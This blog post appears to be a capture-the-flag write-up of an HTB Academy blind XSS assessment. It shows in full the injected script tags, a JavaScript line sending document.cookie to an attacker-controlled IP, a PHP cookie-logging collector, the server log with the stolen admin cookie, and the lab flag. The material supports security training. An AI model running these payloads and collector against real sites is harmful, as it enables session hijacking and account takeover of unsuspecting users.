---
layout: post
title: 'Blind Xss & Session Hijacking'
date: 2025-10-13
categories: [docs]
tag: [XSS,Skills Assessment htb,HTB XSS,Cross-Site Scripting HTB academy,Skills Assessment XSS]
---
![blind-xss](/assets/blind-xss.png "blind-xss")
## 1. Introduction
In this HTB Academy assessment, our goal is to find and exploit an XSS vulnerability on a security blog.
We need to do three things:
- Find a vulnerable input field (blind Xss).
- Inject a script and wait for admin '-'.
- Steal the victim's cookie to get the flag.
Let's break down how to solve it step-by-step.

## 2. Reconnaissance - Finding the Input Field

I began my investigation on the blog's comment section, as it is a common vector for user-input vulnerabilities.
My first step was to craft a simple test comment to analyze the server's response. The immediate reply revealed a crucial piece of information:
"Note: comments must be approved by an admin, so submitting them may take a few seconds."
This message was the key. The mention of an admin who reviews comments indicated that my input would be rendered in a privileged context—a classic setup for a Blind XSS attack.
![xss-admin-comment](/assets/xss-admin-comment.png "xss-admin-comment")

## 3. Crafting the Attack - Stealing the Cookie

To identify which specific input field was vulnerable, I set up a simple PHP server to act as a callback listener. This would log any incoming requests, confirming where my script was executed.
I started the server with the following command:
```bash
└──╼$ sudo php -S 0.0.0.0:8080
[Mon Oct 13 11:26:56 2025] PHP 8.2.29 Development Server (http://0.0.0.0:8080) started
```
Next, I crafted unique payloads for different fields, each pointing to a distinct path on my server. This technique allowed me to pinpoint the exact vulnerable field based on which path was requested.
```html
"><script src=http://10.10.15.109:8080/name></script>
"><script src=http://10.10.15.109:8080/comment></script>
"><script src=http://10.10.15.109:8080/web></script>
```
Note : When I tried a simple script payload in the email field, the application returned an error: "email is invalid". This indicated that the email field had client-side or server-side validation, making it likely not vulnerable and shifting my focus to the other inputs.

![xss-website](/assets/xss-website.png "xss-website")

### let's start stealing admin cookie : 
With the vulnerable field identified, the next step was to craft a payload to steal the administrator's session cookie.

I created a file named script.js with the following code. This script forces the victim's browser to send its cookies to a listener I control. 
```js
document.location='http://10.10.15.109:8080/index.php?c=' + document.cookie;
```

I then injected this script into the vulnerable website field using this payload:
```html
"><script src=http://10.10.15.109:8080/script.js></script>
```

To capture the incoming cookie, I created an index.php file on my server. This script logs the stolen cookie along with the victim's IP address into a cookies.txt file.
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    $file = fopen("cookies.txt", "a+");
    foreach ($list as $value) {
        $cookie = urldecode($value);
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
    }
    fclose($file);
}
?>
```

After the admin reviewed the comment, my server received a request containing their session cookie, which included the flag to complete the assessment.
```bash
[Mon Oct 13 11:26:56 2025] PHP 8.2.29 Development Server (http://0.0.0.0:8080) started
[Mon Oct 13 11:27:10 2025] 10.10.15.109:56760 Accepted
[Mon Oct 13 11:27:10 2025] 10.10.15.109:56760 [200]: GET /index.php
[Mon Oct 13 11:27:10 2025] 10.10.15.109:56760 Closing
[Mon Oct 13 11:27:10 2025] 10.10.15.109:56770 Accepted
[Mon Oct 13 11:27:10 2025] 10.10.15.109:56770 [404]: GET /favicon.ico - No such file or directory
[Mon Oct 13 11:27:10 2025] 10.10.15.109:56770 Closing
[Mon Oct 13 11:27:41 2025] 10.129.102.69:34028 Accepted
[Mon Oct 13 11:27:41 2025] 10.129.102.69:34028 [200]: GET /script.js
[Mon Oct 13 11:27:41 2025] 10.129.102.69:34028 Closing
[Mon Oct 13 11:27:42 2025] 10.129.102.69:34030 Accepted
[Mon Oct 13 11:27:42 2025] 10.129.102.69:34030 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1760372862;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
[Mon Oct 13 11:27:42 2025] 10.129.102.69:34030 Closing
```
flag -> HTB{cr055_5173_5cr1p71n6_n1nj4}

## 4. Conclusion
This Blind XSS attack was successful because the application trusted user input in the comment field. By leaving a malicious script for the admin to review, we stole their cookie and captured the flag.
The lesson is clear (-_-): never trust user input. Proper input validation and output encoding are essential to prevent these attacks.